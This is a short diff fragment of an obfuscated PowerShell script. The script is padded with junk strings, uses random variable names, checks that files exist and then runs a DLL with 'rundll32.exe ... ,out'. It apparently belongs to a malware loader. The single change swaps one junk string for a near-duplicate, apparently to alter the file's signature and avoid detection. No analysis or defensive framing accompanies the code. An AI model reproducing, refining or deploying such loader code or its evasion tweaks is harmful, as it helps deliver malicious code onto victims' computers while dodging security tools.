@@ -28,7 +28,7 @@ $fdinbuergvfr="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfb
 $fdinbuergvfr="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
 Start-Sleep -Seconds 5;
 if ([System.IO.File]::Exists($groihsf)){
-	$jvnsdroger="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
+	$jvnsdroger="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgbihsoidh";
 	if ([System.IO.File]::Exists($fhtreOO)){
 		$mvoisgerg="dfgjkhionjdkkHIUSPIUY(*49945iop4j3tiojrj;lnfdln;dsgnbn;kjfd;kdnfbkn;dflknb;lfnb;lndg;lkbn;lknbkjvcnkbnfgnbihsoidh";
 		rundll32.exe $groihsf,out;
